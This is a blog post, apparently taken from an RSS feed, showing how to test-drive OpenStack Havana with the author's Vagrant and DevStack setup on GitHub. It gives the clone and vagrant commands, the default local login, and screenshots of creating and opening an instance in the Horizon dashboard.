&lt;p&gt;&lt;a href=&quot;http://www.openstack.org/software/havana/&quot;&gt;OpenStack Havana&lt;/a&gt; has just been released. It offers a bunch of new features. Everything is well documented in their &lt;a href=&quot;https://wiki.openstack.org/wiki/ReleaseNotes/Havana&quot;&gt;Release Notes&lt;/a&gt;. It is nice to read, but I need a test drive.&lt;/p&gt;
&lt;p&gt;We are using Open Stack heavily and test new releases via &lt;a href=&quot;http://devstack.org/&quot;&gt;DevStack&lt;/a&gt; before we deploy new releases in our staging environment. What would be easier than trying Havana with a &lt;a href=&quot;http://www.vagrantup.com/&quot;&gt;vagrant box&lt;/a&gt;. You find my vagrant setup at Github &lt;a href=&quot;https://github.com/chris-rock/vagrant-devstack&quot;&gt;https://github.com/chris-rock/vagrant-devstack&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/chris-rock/vagrant-devstack.git
Cloning into &amp;#39;vagrant-devstack&amp;#39;...
remote: Counting objects: 34, done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 34 (delta 11), reused 34 (delta 11)
Unpacking objects: 100% (34/34), done.
Checking connectivity...done
$ cd vagrant-devstack
$ vagrant up
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After a cup of tea you should have the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Horizon is now available at http://192.168.50.10/
Keystone is serving at http://192.168.50.10:5000/v2.0/
Examples on using novaclient command line is in exercise.sh
The default users are: admin and demo
The password: devstack
This is your host ip: 192.168.50.10
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now you type &lt;a href=&quot;http://192.168.50.10&quot;&gt;http://192.168.50.10&lt;/a&gt; in your browser and log into the OpenStack environment with &lt;code&gt;admin&lt;/code&gt; and &lt;code&gt;devstack&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/havana-box/01_openstack_login.png&quot; alt=&quot;Alt text&quot; title=&quot;Horizon Dashboard Login&quot;&gt;&lt;/p&gt;
&lt;p&gt;Then click on the project &lt;code&gt;demo&lt;/code&gt; or &lt;code&gt;admin&lt;/code&gt; on the left hand.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/havana-box/02_openstack_dashboard.png&quot; alt=&quot;Alt text&quot; title=&quot;Dashboard&quot;&gt;&lt;/p&gt;
&lt;p&gt;Start creating your instance and select the Cirros OS as an image. Of course you could upload new images via&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; glance image-create --name YourImage --container-format ovf --disk-format qcow2 --file image_openstack_image.img --is-public True
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;/articles/havana-box/03_openstack_createinstance.png&quot; alt=&quot;Alt text&quot; title=&quot;Optional title&quot;&gt;&lt;/p&gt;
&lt;p&gt;After your created the machine, the image will be spawned.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/havana-box/04_openstack_machines.png&quot; alt=&quot;Alt text&quot; title=&quot;Optional title&quot;&gt;&lt;/p&gt;
&lt;p&gt;Click on the machine details and the console log to see the progress of the machine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/havana-box/05_openstack_machinedetail.png&quot; alt=&quot;Alt text&quot; title=&quot;Optional title&quot;&gt;&lt;/p&gt;
&lt;p&gt;Finally log into the machine via the NoVNC client.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/havana-box/06_openstack_runningmachine.png&quot; alt=&quot;Alt text&quot; title=&quot;Optional title&quot;&gt;&lt;/p&gt;
&lt;p&gt;In case you find bugs, I am happy to merge &lt;a href=&quot;https://github.com/chris-rock/vagrant-devstack&quot;&gt;pull requests&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/chris-rock/vagrant-devstack&quot;&gt;&lt;img id=&quot;fork-me-ribbon&quot; src=&quot;https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png&quot; alt=&quot;Fork me on GitHub&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
  </channel>
</rss>